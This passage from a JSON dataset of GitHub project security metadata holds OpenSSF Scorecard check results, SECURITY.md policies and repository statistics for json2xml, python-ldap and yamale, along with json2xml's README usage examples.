            "future",
            "invalid",
            "need more info",
            "open for contribution",
            "question",
            "wontfix"
        ],
        "README_content": "========\njson2xml\n========\n\n.. image:: https://badge.fury.io/py/json2xml.svg\n.. image:: https://static.pepy.tech/personalized-badge/json2xml?period=total&units=international_system&left_color=blue&right_color=orange&left_text=Downloads\n        :target: https://pepy.tech/project/json2xml\n\n.. image:: https://github.com/vinitkumar/json2xml/actions/workflows/pythonpackage.yml/badge.svg\n.. image:: https://img.shields.io/pypi/pyversions/json2xml.svg\n.. image:: https://readthedocs.org/projects/json2xml/badge/?version=latest\n        :target: https://json2xml.readthedocs.io/en/latest/?badge=latest\n        :alt: Documentation Status\n.. image:: https://codecov.io/gh/vinitkumar/json2xml/branch/master/graph/badge.svg?token=Yt2h55eTL2\n      :target: https://codecov.io/gh/vinitkumar/json2xml\n\njson2xml is a Python library that allows you to convert JSON data into XML format. It's simple, efficient, and easy to use.\n\nDocumentation: https://json2xml.readthedocs.io.\n\nThe library was initially dependent on the `dict2xml` project, but it has now been integrated into json2xml itself. This has led to cleaner code, the addition of types and tests, and overall improved performance.\n\nFeatures\n^^^^^^^^\n\njson2xml supports the following features:\n\n* Conversion from a `json` string to XML\n* Conversion from a `json` file to XML\n* Conversion from an API that emits `json` data to XML\n\nUsage\n^^^^^\n\nYou can use the json2xml library in the following ways:\n\n\n.. code-block:: python\n\n    from json2xml import json2xml\n    from json2xml.utils import readfromurl, readfromstring, readfromjson\n\n    # Convert JSON data from a URL to XML\n    data = readfromurl(\"https://api.publicapis.org/entries\")\n    print(json2xml.Json2xml(data).to_xml())\n\n    # Convert a JSON string to XML\n    data = readfromstring(\n        '{\"login\":\"mojombo\",\"id\":1,\"avatar_url\":\"https://avatars0.githubusercontent.com/u/1?v=4\"}'\n    )\n    print(json2xml.Json2xml(data).to_xml())\n\n    # Convert a JSON file to XML\n    data = readfromjson(\"examples/licht.json\")\n    print(json2xml.Json2xml(data).to_xml())\n\n\nCustom Wrappers and Indentation\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nBy default, a wrapper `all` and pretty `True` is set. However, you can easily change this in your code like this:\n\n.. code-block:: python\n\n    from json2xml import json2xml\n    from json2xml.utils import readfromurl, readfromstring, readfromjson\n\n    data = readfromstring(\n        '{\"login\":\"mojombo\",\"id\":1,\"avatar_url\":\"https://avatars0.githubusercontent.com/u/1?v=4\"}'\n    )\n    print(json2xml.Json2xml(data, wrapper=\"all\", pretty=True).to_xml())\n\n\nOutputs this:\n\n.. code-block:: xml\n\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <all>\n      <login type=\"str\">mojombo</login>\n      <id type=\"int\">1</id>\n      <avatar_url type=\"str\">https://avatars0.githubusercontent.com/u/1?v=4</avatar_url>\n    </all>\n\nOmit List item\n^^^^^^^^^^^^^^\n\nAssume the following json input\n\n.. code-block:: json\n\n    {\n      \"my_items\": [\n        { \"my_item\": { \"id\": 1 } },\n        { \"my_item\": { \"id\": 2 } }\n      ],\n      \"my_str_items\": [\"a\", \"b\"]\n    }\n\nBy default, items in an array are wrapped in <item></item>.\n\nDefault output:\n\n.. code-block:: xml\n\n    <?xml version=\"1.0\" ?>\n    <all>\n      <my_items type=\"list\">\n        <item type=\"dict\">\n          <my_item type=\"dict\">\n            <id type=\"int\">1</id>\n          </my_item>\n        </item>\n        <item type=\"dict\">\n          <my_item type=\"dict\">\n            <id type=\"int\">2</id>\n          </my_item>\n        </item>\n      </my_items>\n      <my_str_items type=\"list\">\n        <item type=\"str\">a</item>\n        <item type=\"str\">b</item>\n      </my_str_items>\n      <empty type=\"list\"/>\n    </all>\n\nHowever, you can change this behavior using the item_wrap property like this:\n\n.. code-block:: python\n\n    from json2xml import json2xml\n    from json2xml.utils import readfromurl, readfromstring, readfromjson\n\n    data = readfromstring('{\"my_items\":[{\"my_item\":{\"id\":1} },{\"my_item\":{\"id\":2} }],\"my_str_items\":[\"a\",\"b\"]}')\n    print(json2xml.Json2xml(data, item_wrap=False).to_xml())\n\nOutputs this:\n\n.. code-block:: xml\n\n    <?xml version=\"1.0\" ?>\n    <all>\n      <my_items type=\"list\">\n        <my_item type=\"dict\">\n          <id type=\"int\">1</id>\n        </my_item>\n        <my_item type=\"dict\">\n          <id type=\"int\">2</id>\n        </my_item>\n      </my_items>\n      <my_str_items type=\"str\">a</my_str_items>\n      <my_str_items type=\"str\">b</my_str_items>\n    </all>\n\nOptional Attribute Type Support\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nYou can also specify if the output XML needs to have type specified or not. Here is the usage:\n\n .. code-block:: python\n\n    from json2xml import json2xml\n    from json2xml.utils import readfromurl, readfromstring, readfromjson\n\n    data = readfromstring(\n        '{\"login\":\"mojombo\",\"id\":1,\"avatar_url\":\"https://avatars0.githubusercontent.com/u/1?v=4\"}'\n    )\n    print(json2xml.Json2xml(data, wrapper=\"all\", pretty=True, attr_type=False).to_xml())\n\n\nOutputs this:\n\n.. code-block:: xml\n\n    <?xml version=\"1.0\" ?>\n    <all>\n      <login>mojombo</login>\n      <id>1</id>\n      <avatar_url>https://avatars0.githubusercontent.com/u/1?v=4</avatar_url>\n    </all>\n\n\nThe methods are simple and easy to use and there are also checks inside of code to exit cleanly\nin case any of the input(file, string or API URL) returns invalid JSON.\n\nHow to run tests\n^^^^^^^^^^^^^^^^\n\nThis is provided by pytest, which is straight forward.\n\n .. code-block:: console\n\n    virtualenv venv -p $(which python3.9)\n    pip install -r requirements-dev.txt\n    python setup.py install\n    pytest -vv\n\n\nHelp and Support to maintain this project\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- You can sponsor my work for this plugin here: https://github.com/sponsors/vinitkumar/\n\n",
        "num_commits": 382,
        "project_age_days": 4133,
        "project_created_at": "2013-07-06",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 12,
        "num_pull": 149,
        "num_issues": 220,
        "num_opening_issue": 7,
        "project_size(kB)": 984,
        "num_stargazers": 98,
        "num_watchers": 98,
        "num_forks": 32,
        "num_subscribers": 2,
        "SecurityPolicy_created_at": "2023-01-06 08:01:38",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "b339a22696b6284229ecef0eff39a8581c4290e8",
                "url": "https://github.com/vinitkumar/json2xml/commit/b339a22696b6284229ecef0eff39a8581c4290e8",
                "date": "2023-01-06 08:01:38"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "python-ldap/python-ldap",
        "project_url": "https://github.com/python-ldap/python-ldap",
        "SSF": {
            "date": "2024-10-29T23:45:07+07:00",
            "repo": {
                "name": "github.com/python-ldap/python-ldap",
                "commit": "326f8708ca6d6fff36893a38f38b645bed9c5e6f"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.5,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "11 out of 27 merged PRs checked by a CI test -- score normalized to 4",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 7,
                    "reason": "Found 21/29 approved changesets -- score normalized to 7",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: python contributor org/company found, freeipa contributor org/company found, 389ds contributor org/company found, authlib contributor org/company found, fedora-python contributor org/company found, PyLadiesCZ contributor org/company found, latchset contributor org/company found, django-mptt contributor org/company found, railsadminteam contributor org/company found, OCA contributor org/company found, pyvec contributor org/company found, dogtagpki contributor org/company found, django-auth-ldap contributor org/company found, plone contributor org/company found, python-ldap contributor org/company found, red hat contributor org/company found, zopefoundation contributor org/company found, redhatofficial contributor org/company found, pytest-dev contributor org/company found, telecoop contributor org/company found, pallets-eco contributor org/company found, FactoryBoy contributor org/company found, pyparsing contributor org/company found, python-distro contributor org/company found, pioneer valley books contributor org/company found, yaal-coop contributor org/company found, supercoopbdx contributor org/company found, univention gmbh contributor org/company found, django contributor org/company found, jazzband contributor org/company found, wtforms contributor org/company found, requests contributor org/company found, urllib3 contributor org/company found, Pioneer-Valley-Books contributor org/company found, Pylons contributor org/company found, denemo contributor org/company found, univention contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 37 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENCE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 1,
                    "reason": "2 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 1",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/python-ldap/python-ldap/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/python-ldap/python-ldap/ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tox-fedora.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/python-ldap/python-ldap/tox-fedora.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tox-fedora.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/python-ldap/python-ldap/tox-fedora.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:56",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:57",
                        "Info:   0 out of   3 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 28 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact python-ldap-3.3.1 not signed: https://api.github.com/repos/python-ldap/python-ldap/releases/28026990",
                        "Warn: release artifact python-ldap-3.3.1 does not have provenance: https://api.github.com/repos/python-ldap/python-ldap/releases/28026990"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/ci.yml:13",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/tox-fedora.yml:6",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 10,
                    "reason": "GitHub workflow tokens follow principle of least privilege",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/python-ldap/python-ldap/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nSecurity updates are applied only to the latest release.\n\n## Reporting a Vulnerability\n\nIf you have discovered a security vulnerability in this project, please report it privately. **Do not disclose it as a public issue.** This gives us time to work with you to fix the issue before public exposure, reducing the chance that the exploit will be used before a patch is released.\n\nPlease disclose it at our [security advisory](https://github.com/python-ldap/python-ldap/security/advisories/new).\n\nThis project is maintained by a team of volunteers on a reasonable-effort basis. As such, vulnerabilities will be disclosed in a best effort base.\n",
        "project_all_labels": [
            "bug",
            "correctness",
            "doc",
            "ease-of-use",
            "enhancement",
            "feature",
            "good first issue",
            "help wanted",
            "infra",
            "needs-docs",
            "needs-tests",
            "on hold",
            "performance",
            "question",
            "spam",
            "tests",
            "wip"
        ],
        "README_content": "README",
        "num_commits": 961,
        "project_age_days": 2532,
        "project_created_at": "2017-11-23",
        "latest_updated_at": "2024-10-18",
        "latest_pushed_at": "2024-10-11",
        "num_contributors": 31,
        "num_pull": 311,
        "num_issues": 578,
        "num_opening_issue": 100,
        "project_size(kB)": 1252,
        "num_stargazers": 401,
        "num_watchers": 401,
        "num_forks": 120,
        "num_subscribers": 21,
        "SecurityPolicy_created_at": "2023-07-27 23:55:14",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "72c1b5e0f37f74b1a68e67b6b5712d395d577bb9",
                "url": "https://github.com/python-ldap/python-ldap/commit/72c1b5e0f37f74b1a68e67b6b5712d395d577bb9",
                "date": "2023-07-27 23:55:14"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "23andme/yamale",
        "project_url": "https://github.com/23andme/yamale",
        "SSF": {
            "date": "2024-10-30T00:39:27+07:00",
            "repo": {
                "name": "github.com/23andme/yamale",
                "commit": "bacaa1d8e20395e11fe087cb7a7cb0365c2afd50"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.4,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "6 out of 9 merged PRs checked by a CI test -- score normalized to 6",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 7,
                    "reason": "Found 8/11 approved changesets -- score normalized to 7",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: BlueGouda contributor org/company found, Colorsublime contributor org/company found, hotwire-django contributor org/company found, totem-technologies contributor org/company found, 23andMe contributor org/company found, 23andme contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 6 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/pypi-publish.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/pypi-publish.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/run-tests.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/run-tests.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/run-tests.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/run-tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/run-tests.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/23andMe/Yamale/run-tests.yml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pypi-publish.yml:24",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pypi-publish.yml:25",
                        "Warn: pipCommand not pinned by hash: .github/workflows/run-tests.yml:28",
                        "Warn: pipCommand not pinned by hash: .github/workflows/run-tests.yml:29",
                        "Warn: pipCommand not pinned by hash: .github/workflows/run-tests.yml:30",
                        "Info:   0 out of   8 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   5 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 12 commits out of 27 are checked with a SAST tool"
                    ],
                    "score": 8,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql.yml:16",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql.yml:17",
                        "Warn: no topLevel permission defined: .github/workflows/codeql.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pypi-publish.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/run-tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/23andme/yamale/contents/SECURITY.md",
